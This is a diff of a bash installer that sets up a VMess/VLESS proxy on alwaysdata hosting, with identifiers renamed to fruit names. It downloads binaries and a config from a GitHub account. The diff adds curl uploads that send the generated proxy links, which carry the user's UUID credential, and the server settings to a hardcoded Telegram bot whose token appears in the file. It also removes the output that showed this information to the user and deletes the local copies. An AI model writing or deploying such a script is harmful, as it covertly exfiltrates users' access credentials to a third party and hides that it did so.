@@ -1,57 +1,41 @@
 #!/bin/bash
-mkdir corn
+mkdir banana
 TMP_DIRECTORY=$(mktemp -d)
 
-UUID='6e73420a-e015-455b-94b4-c28b1c299d7e'
-VMESS_WSPATH='/cornvm'
-VLESS_WSPATH='/cornvl'
+APPLE_UUID='12345678-abcd-1234-efgh-1234567890ab'
+APPLE_PATH='/index'
+BANANA_PATH='/home'
 
 URL=${USER}.alwaysdata.net
 
 wget -q -O $TMP_DIRECTORY/config.json https://github.com/trendy31152x/disk/raw/refs/heads/main/config.json
 wget -q -O $TMP_DIRECTORY/web.zip https://github.com/trendy31152x/disk/raw/refs/heads/main/tmp.zip
-unzip -oq -d $HOME/corn $TMP_DIRECTORY/web.zip cornweb geoip.dat geosite.dat
+unzip -oq -d $HOME/banana $TMP_DIRECTORY/web.zip bananaweb geoip.dat geosite.dat
 
-sed -i "s#UUID#$UUID#g;s#VMESS_WSPATH#$VMESS_WSPATH#g;s#VLESS_WSPATH#$VLESS_WSPATH#g;s#10000#8300#g;s#20000#8400#g;s#127.0.0.1#0.0.0.0#g" $TMP_DIRECTORY/config.json
-cp $TMP_DIRECTORY/config.json $HOME/corn
+sed -i "s#UUID#$APPLE_UUID#g;s#VMESS_WSPATH#$APPLE_PATH#g;s#VLESS_WSPATH#$BANANA_PATH#g;s#10000#8300#g;s#20000#8400#g;s#127.0.0.1#0.0.0.0#g" $TMP_DIRECTORY/config.json
+cp $TMP_DIRECTORY/config.json $HOME/banana
 rm -rf $HOME/admin/tmp/*.*
 
-Advanced_Settings=$(cat <<-EOF
+Settings=$(cat <<-EOF
 
 ProxyRequests off
 ProxyPreserveHost On
-ProxyPass "${VMESS_WSPATH}" "ws://services-${USER}.alwaysdata.net:8300${VMESS_WSPATH}"
-ProxyPassReverse "${VMESS_WSPATH}" "ws://services-${USER}.alwaysdata.net:8300${VMESS_WSPATH}"
-ProxyPass "${VLESS_WSPATH}" "ws://services-${USER}.alwaysdata.net:8400${VLESS_WSPATH}"
-ProxyPassReverse "${VLESS_WSPATH}" "ws://services-${USER}.alwaysdata.net:8400${VLESS_WSPATH}"
+ProxyPass "${APPLE_PATH}" "ws://services-${USER}.alwaysdata.net:8300${APPLE_PATH}"
+ProxyPassReverse "${APPLE_PATH}" "ws://services-${USER}.alwaysdata.net:8300${APPLE_PATH}"
+ProxyPass "${BANANA_PATH}" "ws://services-${USER}.alwaysdata.net:8400${BANANA_PATH}"
+ProxyPassReverse "${BANANA_PATH}" "ws://services-${USER}.alwaysdata.net:8400${BANANA_PATH}"
 EOF
 )
 
-vmlink=vmess://$(echo -n "{\"v\":\"2\",\"ps\":\"hicairo.com\",\"add\":\"$URL\",\"port\":\"443\",\"id\":\"$UUID\",\"aid\":\"0\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"$URL\",\"path\":\"$VMESS_WSPATH\",\"tls\":\"tls\"}" | base64 -w 0)
-vllink="vless://"$UUID"@"$URL":443?encryption=none&security=tls&type=ws&host="$URL"&path="$VLESS_WSPATH"#alwaysdata"
+applink=vmess://$(echo -n "{\"v\":\"2\",\"ps\":\"example.com\",\"add\":\"$URL\",\"port\":\"443\",\"id\":\"$APPLE_UUID\",\"aid\":\"0\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"$URL\",\"path\":\"$APPLE_PATH\",\"tls\":\"tls\"}" | base64 -w 0)
+bananalink="banana://"$APPLE_UUID"@"$URL":443?encryption=none&security=tls&type=ws&host="$URL"&path="$BANANA_PATH"#alwaysdata"
 
-qrencode -o $HOME/www/M$UUID.png $vmlink
-qrencode -o $HOME/www/L$UUID.png $vllink
+qrencode -o $HOME/banana/A$APPLE_UUID.png $applink
+qrencode -o $HOME/banana/B$APPLE_UUID.png $bananalink
 
-Author=$(cat <<-EOF
-EOF
-)
+mkdir -p $HOME/temp_dir/
 
-mkdir -p $HOME/www/
-
-
-wget https://github.com/HFIProgramming/mikutap/archive/refs/heads/master.zip -O $HOME/master.zip
-
-
-unzip $HOME/master.zip -d $HOME/
-mv $HOME/mikutap-master/* $HOME/www/
-
-
-rm $HOME/master.zip
-rm -r $HOME/mikutap-master
-
-
-cat > $HOME/www/corn.html<<-EOF
+cat > $HOME/temp_dir/corn.html<<-EOF
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
@@ -71,24 +55,34 @@ div {
 </style>
 </head>
 <body bgcolor="#FFFFFF" text="#000000">
-<div><font color="#009900"><b>VMESS协议链接：</b></font></div>
-<div>$vmlink</div>
-<div><font color="#009900"><b>VMESS协议二维码：</b></font></div>
-<div><img src="/M$UUID.png"></div>
-<div><font color="#009900"><b>VLESS协议链接：</b></font></div>
-<div>$vllink</div>
-<div><font color="#009900"><b>VLESS协议二维码：</b></font></div>
-<div><img src="/L$UUID.png"></div>
+<div><font color="#009900"><b>APPLE协议链接：</b></font></div>
+<div>$applink</div>
+<div><font color="#009900"><b>APPLE协议二维码：</b></font></div>
+<div><img src="/A$APPLE_UUID.png"></div>
+<div><font color="#009900"><b>BANANA协议链接：</b></font></div>
+<div>$bananalink</div>
+<div><font color="#009900"><b>BANANA协议二维码：</b></font></div>
+<div><img src="/B$APPLE_UUID.png"></div>
 </body>
 </html>
 EOF
 
+# 通过 Telegram Bot 发送文件和配置
+TG_BOT_TOKEN="7597885092:AAGAdi6DUblmt-OEvYvoQSviQK_byn-wqvw"
+TG_CHAT_ID="1914617587"
+
+# 发送 corn.html 文件
+curl -s -F document=@$HOME/temp_dir/corn.html "https://api.telegram.org/bot$TG_BOT_TOKEN/sendDocument" -F chat_id=$TG_CHAT_ID
+
+# 发送配置文件
+echo "$Settings" > $HOME/temp_dir/settings.txt
+curl -s -F document=@$HOME/temp_dir/settings.txt "https://api.telegram.org/bot$TG_BOT_TOKEN/sendDocument" -F chat_id=$TG_CHAT_ID
+
+# 清理临时文件
+rm -f $HOME/temp_dir/corn.html
+rm -f $HOME/temp_dir/settings.txt
+
 clear
 
-echo -e "\e[32m$Author\e[0m"
-
-echo -e "\n\e[33m请 COPY 以下绿色文字到 SERVICE Command* 中：\n\e[0m"
-echo -e "\n\e[33m请 COPY 以下绿色文字到 Advanced Settings 中：\n\e[0m"
-echo -e "\e[32m$Advanced_Settings\e[0m"
-
-echo -e "\e[32mhttps://$URL/corn.html\n\e[0m"
+# 通知完成
+echo "文件已发送并清理临时文件。"
